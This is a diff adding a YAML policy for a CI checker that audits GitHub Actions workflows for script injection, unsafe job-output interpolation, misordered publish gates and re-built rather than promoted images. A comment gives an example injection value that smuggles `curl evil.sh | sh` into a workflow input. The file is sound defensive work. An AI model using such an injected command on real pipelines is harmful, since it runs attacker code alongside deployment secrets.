@@ -1,0 +1,140 @@
+# Workflow semantics policy.
+#
+# Enforced by `go run ./cmd/ops-gate -check workflows`. Two classes of
+# defect, both of which a YAML linter and a human review had already
+# walked past:
+#
+#   1. SCRIPT INJECTION — `run: … ${{ inputs.version }} …` splices an
+#      operator-supplied string straight into a shell that also holds
+#      deployment secrets. `-f version='"; curl evil.sh | sh; #'` runs as
+#      the job. The fix is mechanical: pass it through `env:` and
+#      reference a quoted "$VAR".
+#
+#   2. IMPLICIT success() — a job with `needs:` and a custom `if:` still
+#      carries an implicit `success()` on its dependencies. The rollback
+#      job was gated on `inputs.confirm == 'ROLLBACK'` and needed an
+#      evaluator that deliberately exits non-zero for a rollback verdict,
+#      so it was skipped in exactly the case it existed for.
+version: 1
+
+workflows:
+  - .github/workflows/ops-gate.yml
+  - .github/workflows/post-deploy-smoke.yml
+  - .github/workflows/deploy-rollback.yml
+  - .github/workflows/backup-restore-drill.yml
+  - .github/workflows/capacity-test.yml
+  - .github/workflows/release.yml
+
+# Any `${{ … }}` inside a `run:` script whose body mentions one of these
+# is an error. `env:` blocks are unaffected — that is the safe channel.
+untrusted_contexts:
+  - "inputs."
+  - "github.event.inputs."
+  - "github.event.pull_request."
+  - "github.event.issue."
+  - "github.event.comment."
+  - "github.event.head_commit.message"
+  - "github.head_ref"
+  - "github.actor"
+  - "github.triggering_actor"
+
+# Exact expressions that are safe to interpolate directly. Each is either
+# GitHub-generated with a constrained character set, or not
+# attacker-influenced at all. Matched after whitespace normalisation.
+trusted_expressions:
+  - "github.run_id"
+  - "github.run_number"
+  - "github.repository"
+  - "github.repository_owner"
+  - "github.server_url"
+  - "github.sha"
+  - "github.ref_name"
+  - "github.workspace"
+
+require_status_function_on_conditional_needs: true
+
+# Any `${{ … }}` inside a `run:` script whose body STARTS with one of
+# these is an error too — but for a different reason than injection.
+#
+# Nobody attacks a job output; the DATA itself breaks. `release-notes`
+# interpolated `needs.vulnerability-report.outputs.summary` into an
+# expanding heredoc. That summary is a Markdown table whose image names
+# are wrapped in BACKTICKS, so bash treated them as command
+# substitution: it ran `api` as a command, printed
+# `api: command not found` to stderr, substituted the empty string, and
+# exited 0. The published release notes carried a security table with
+# blank image names and nothing failed.
+#
+# `set -euo pipefail` does not neutralise this — the substitution
+# "succeeded". Only env indirection does, because bash never re-scans
+# the result of a parameter expansion.
+job_output_contexts:
+  - "needs."
+  - "steps."
+
+# ── Publish gates ────────────────────────────────────────────────────
+#
+# Every job that creates a public or persistent artifact must depend —
+# transitively — on the job that gates it. A gate that runs after the
+# push blocks nothing: the image, chart, or tag is already out there.
+#
+# The release workflow used to push :version AND :latest, sign, attest,
+# and publish the Helm chart, and only then run `vulnerability-report`,
+# whose failure could block nothing but the release notes. A fixable
+# CRITICAL reached every consumer pulling :latest while the run showed
+# red.
+publish_gates:
+  - workflow: .github/workflows/release.yml
+    gate_job: vulnerability-report
+    publish_jobs:
+      - docker         # pushes :version and :latest, signs, attests
+      - helm           # pushes the chart to the OCI registry
+      - release-notes  # pushes the git tag and creates the GitHub release
+    rationale: >-
+      Images are built ONCE in build-scan and exported as a
+      docker-archive (push: false, outputs: type=docker,dest=…). Nothing
+      leaves the runner until the aggregated verdict is clean; the
+      publish stage promotes that exact archive with `crane push`.
+
+# ── Artifact promotion ───────────────────────────────────────────────
+#
+# Job ordering is necessary but not sufficient. The previous release
+# workflow had perfect ordering — build-scan → vulnerability-report →
+# docker — and still published bytes that were never scanned, because
+# `docker` RE-BUILT the same Dockerfile with `push: true` instead of
+# promoting the assessed artifact.
+#
+# Two builds are not one artifact. An unpinned base tag
+# (`FROM alpine:3.20`), an evicted GHA cache entry, or any
+# non-reproducible layer makes the pushed image differ from the scanned
+# one. The cosign signature and the SLSA provenance would then describe
+# bytes nobody assessed — worse than no attestation, because it reads as
+# assurance.
+#
+# The enforceable shape: build once → export a docker-archive → scan the
+# archive → upload it → download and `crane push` that same archive,
+# with a digest comparison proving continuity. The publish job must not
+# invoke a build action at all.
+artifact_promotion:
+  - workflow: .github/workflows/release.yml
+    scan_job: build-scan
+    publish_jobs:
+      - docker
+    build_actions:
+      - docker/build-push-action
+    upload_action: actions/upload-artifact
+    download_action: actions/download-artifact
+    # Both halves must name the same artifact, and the name must carry
+    # the image and the version so parallel matrix legs cannot collide.
+    artifact_prefix: "image-"
+    isolation_tokens:
+      - "matrix.image"
+      - "outputs.version"
+    continuity_marker: "DIGEST CONTINUITY"
+    push_commands:
+      - "crane push"
+      - "docker push"
+    rationale: >-
+      The scanned archive's config digest commits to every layer
+      diff_id, so comparing it to the pushed manifest's config digest
+      proves the published image is the image that was assessed.
